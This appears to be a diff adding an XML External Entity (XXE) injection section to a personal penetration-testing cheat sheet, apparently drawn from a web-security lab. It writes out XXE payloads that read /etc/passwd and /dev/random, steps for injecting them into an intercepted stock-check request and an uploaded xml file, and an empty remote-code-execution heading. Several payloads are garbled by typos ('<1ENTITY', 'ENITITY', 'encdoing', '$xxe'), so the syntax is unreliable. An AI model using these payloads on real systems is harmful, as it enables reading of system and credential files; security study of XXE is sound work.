@@ -452,6 +452,41 @@ $ dotdotpwn
 
 
 
+####### XML External Entity (XXE) Injection ########
+
+Accessing a local resource that may not return
+-- Template:
+	<?xml version-"1.0" encoding="ISO-8859-1"?>
+	<!DOCtYPE foo [
+		<!ELEMENT foo ANY >
+		<1ENTITY xxe SYSTEM 'file:///dev/random'>]>
+	<foo>&xxe;</foo>
+-- Example:
+	- Intercept checkout request
+		<?xml version="1.0" encdoing"UTFo-8"?>
+			<!DOCTYPE foo [
+			<!ENITITY xxe SYSTEM 'file:///etc/passwd' >]>
+		<stockCheck>
+			<productId>
+				2 // Here is where I could insert $xxe; to exec.
+			</productId>
+			<storeId>
+				1
+			</storeId>
+
+-- File Execution
+	- Create xxe.xml file with execution code template and save changes
+		<?xml version-"1.0" encoding="UTF-8"?>
+		<!DOCtYPE foo [
+		    <!ELEMENT foo ANY >
+		    <1ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
+		<foo>&xxe;</foo>
+
+	- Find "Browse Files" button or where I would upload a file
+	- Upload xml file and intercept submit request to locate xml file
+
+-- Remote Code Execution
+	- 
 
 
 
